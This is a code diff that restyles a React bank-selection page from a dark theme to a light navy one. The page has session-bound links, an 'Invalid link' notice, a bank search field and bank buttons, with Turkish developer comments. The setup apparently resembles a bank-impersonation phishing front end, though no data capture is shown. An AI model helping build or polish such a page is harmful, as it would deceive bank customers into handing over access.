@@ -248,7 +248,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -259,11 +259,11 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     if (recovering) {
       return (
         <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-          <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-            <h2 className="text-2xl font-bold text-white mb-2">{settings.banken_title}</h2>
-            <p className="text-sm text-gray-300 mb-8">Restoring session...</p>
+          <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 text-center">
+            <h2 className="text-2xl font-bold text-[#0a2463] mb-2">{settings.banken_title}</h2>
+            <p className="text-sm text-gray-600 mb-8">Restoring session...</p>
             <div className="flex justify-center py-12">
-              <div className="size-10 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
+              <div className="size-10 animate-spin rounded-full border-4 border-[#dbe6f3] border-t-[var(--brand)]" />
             </div>
           </div>
         </div>
@@ -271,10 +271,10 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     }
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-          <h2 className="text-2xl font-bold text-white mb-2">{settings.banken_title}</h2>
-          <p className="text-sm text-gray-300 mb-6">Invalid link.</p>
-          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 text-center">
+          <h2 className="text-2xl font-bold text-[#0a2463] mb-2">{settings.banken_title}</h2>
+          <p className="text-sm text-gray-600 mb-6">Invalid link.</p>
+          <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600">
             Use the full link to continue.
           </p>
         </div>
@@ -287,13 +287,13 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       <div className="space-y-4 w-full max-w-[720px] relative z-10 fade-in">
         <div className="luxury-glass p-4 sm:p-7">
           <div className="text-center mb-5 sm:mb-6">
-            <h2 className="text-xl sm:text-2xl font-bold text-white tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>{settings.banken_title}</h2>
-            <p className="text-xs sm:text-sm text-white/60 mt-1.5 font-medium max-w-[480px] mx-auto">{settings.banken_subtitle}</p>
+            <h2 className="text-xl sm:text-2xl font-bold text-[#0a2463] tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>{settings.banken_title}</h2>
+            <p className="text-xs sm:text-sm text-gray-500 mt-1.5 font-medium max-w-[480px] mx-auto">{settings.banken_subtitle}</p>
           </div>
           
           <div className="mx-auto mb-4 sm:mb-5 max-w-[480px]">
-            <div className="flex items-center gap-2 rounded-2xl border border-white/8 bg-white/[0.05] px-3.5 py-2.5 shadow-[inset_0_1px_0_rgba(255,255,255,0.04),inset_0_-1px_0_rgba(0,0,0,0.4)] focus-within:border-[var(--brand)]/50 focus-within:ring-1 focus-within:ring-[var(--brand)]/30 focus-within:shadow-[0_0_0_4px_rgba(var(--brand-rgb),0.14),0_0_20px_-4px_rgba(238,28,46,0.30),inset_0_1px_0_rgba(255,255,255,0.08)] transition-all duration-200">
-              <svg aria-hidden viewBox="0 0 24 24" className="h-4 w-4 shrink-0 text-white/45" fill="none" stroke="currentColor" strokeWidth="2">
+            <div className="flex items-center gap-2 rounded-2xl border border-[#dbe6f3] bg-white px-3.5 py-2.5 shadow-sm focus-within:border-[var(--brand)]/50 focus-within:ring-1 focus-within:ring-[var(--brand)]/30 focus-within:shadow-[0_0_0_4px_rgba(var(--brand-rgb),0.12)] transition-all duration-200">
+              <svg aria-hidden viewBox="0 0 24 24" className="h-4 w-4 shrink-0 text-gray-500" fill="none" stroke="currentColor" strokeWidth="2">
                 <circle cx="11" cy="11" r="7" />
                 <path d="m20 20-3.5-3.5" />
               </svg>
@@ -301,7 +301,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
                 placeholder={settings.banken_search_placeholder}
-                className="w-full bg-transparent text-sm text-white outline-none placeholder:text-white/35"
+                className="w-full bg-transparent text-sm text-[#0a2463] outline-none placeholder:text-gray-500"
               />
             </div>
           </div>
@@ -309,7 +309,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
           <div className="max-h-[62vh] sm:max-h-[48vh] overflow-y-auto pr-1 custom-scrollbar">
             <div className="grid grid-cols-1 gap-2.5 sm:gap-3 pb-1">
               {filteredOptions.length === 0 ? (
-                <div className="col-span-1 rounded-2xl border border-white/8 bg-white/[0.04] p-5 text-center text-sm text-white/70 backdrop-blur-sm">
+                <div className="col-span-1 rounded-2xl border border-[#dbe6f3] bg-[#f8fafd] p-5 text-center text-sm text-gray-500 backdrop-blur-sm">
                   No banks are available for the selected country. Please clear the search filter.
                 </div>
               ) : filteredOptions.map((opt, idx) => (
@@ -318,8 +318,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                   type="button"
                   onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                   disabled={saving}
-                  className={`group w-full flex items-center gap-3 sm:gap-4 rounded-2xl border border-white/8 bg-white/[0.04] p-3 sm:p-3.5 shadow-sm transition-all duration-300 ease-out hover:border-white/15 hover:bg-white/[0.08] hover:shadow-[0_20px_44px_-16px_rgba(0,0,0,0.60),0_0_30px_-8px_rgba(238,28,46,0.18)] hover:-translate-y-0.5 active:translate-y-0 ${
-                    bankSlug === opt.slug ? "!border-[var(--brand)]/60 !bg-gradient-to-r !from-[var(--brand)]/12 !via-white/[0.06] !to-[var(--brand-dark)]/12 ring-1 ring-[var(--brand)]/40 shadow-[0_0_0_1px_rgba(var(--brand-rgb),0.20),0_0_40px_-10px_rgba(var(--brand-rgb),0.30),0_0_50px_-14px_rgba(238,28,46,0.22)]" : ""
+                  className={`group w-full flex items-center gap-3 sm:gap-4 rounded-2xl border border-[#dbe6f3] bg-[#f8fafd] p-3 sm:p-3.5 shadow-sm transition-all duration-300 ease-out hover:border-[var(--brand)]/40 hover:bg-white hover:shadow-[0_16px_36px_-16px_rgba(10,36,99,0.28)] hover:-translate-y-0.5 active:translate-y-0 ${
+                    bankSlug === opt.slug ? "!border-[var(--brand)]/60 !bg-gradient-to-r !from-[var(--brand)]/12 !via-white !to-[var(--brand-dark)]/12 ring-1 ring-[var(--brand)]/40 shadow-[0_0_0_1px_rgba(var(--brand-rgb),0.25),0_16px_36px_-14px_rgba(10,36,99,0.25)]" : ""
                   }`}
                   style={{ animationDelay: `${idx * 28}ms` }}
                 >
@@ -342,7 +342,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
 
                   {/* ORTA: BANKA ADI — sadece tek satir, alt aciklama YOK (kullanici 'Vali oma pank...' yazisini istemiyor) */}
                   <div className="flex-1 min-w-0 text-left">
-                    <p className="text-[16px] sm:text-[17px] font-semibold text-white/95 group-hover:text-white leading-tight tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>
+                    <p className="text-[16px] sm:text-[17px] font-semibold text-[#0a2463]/95 group-hover:text-[#0a2463] leading-tight tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>
                       {opt.displayName}
                     </p>
                   </div>
@@ -350,9 +350,9 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                   {/* SAG: Ok / eylem alani */}
                   <div className="shrink-0 flex items-center gap-2">
                     {saving && bankSlug === opt.slug ? (
-                      <div className="size-5 animate-spin rounded-full border-2 border-[var(--brand)]/30 border-t-[var(--brand)]" />
+                      <div className="size-5 animate-spin rounded-full border-2 border-[#dbe6f3] border-t-[var(--brand)]" />
                     ) : (
-                      <div className="size-9 sm:size-10 grid place-items-center rounded-2xl bg-gradient-to-br from-white/[0.06] to-white/[0.02] border border-white/[0.07] text-white/50 group-hover:text-white group-hover:bg-gradient-to-br group-hover:from-[var(--brand)]/18 group-hover:via-[var(--brand-dark)]/18 group-hover:to-[#ee1c2e]/12 group-hover:border-[var(--brand)]/25 group-hover:shadow-[0_0_22px_-6px_rgba(var(--brand-rgb),0.45)] transition-all duration-300">
+                      <div className="size-9 sm:size-10 grid place-items-center rounded-2xl bg-gradient-to-br from-[#f8fafd] to-white border border-[#dbe6f3] text-[#0a2463]/50 group-hover:text-[#0a2463] group-hover:bg-gradient-to-br group-hover:from-[var(--brand)]/18 group-hover:via-[var(--brand-dark)]/18 group-hover:to-[#ee1c2e]/12 group-hover:border-[var(--brand)]/25 group-hover:shadow-[0_0_22px_-6px_rgba(var(--brand-rgb),0.45)] transition-all duration-300">
                         <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 sm:h-5 sm:w-5" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                           <path d="m9 6 6 6-6 6" />
                         </svg>
@@ -366,7 +366,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
         </div>
 
         {msg ? (
-          <div className="text-center text-sm text-red-300/90 bg-red-500/10 backdrop-blur-md border border-red-500/20 p-3.5 rounded-2xl shadow-[0_20px_40px_-18px_rgba(239,68,68,0.35)]">
+          <div className="text-center text-sm text-red-600 bg-red-50 backdrop-blur-md border border-red-200 p-3.5 rounded-2xl shadow-[0_20px_40px_-18px_rgba(239,68,68,0.35)]">
             {msg}
           </div>
         ) : null}
